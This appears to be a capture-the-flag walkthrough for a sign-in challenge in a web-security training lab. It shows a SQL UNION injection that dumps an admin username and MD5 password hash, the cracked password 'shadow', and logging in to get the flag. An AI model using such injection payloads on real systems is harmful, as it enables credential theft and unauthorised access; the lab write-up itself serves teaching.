# signin

Using the same logic from the [members list](../../members/ressources/walktrough.md)
we can with an sql injection like `1 UNION SELECT username, password FROM Member_Brute_Force.db_default`
get this result
```
ID: 1 UNION SELECT username, password FROM Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```
---
If we assume this is md5, it will be `shadow`. If we try to login at `/?page=signin`
with the username `admin` and the password `shadow`, we got the flag.
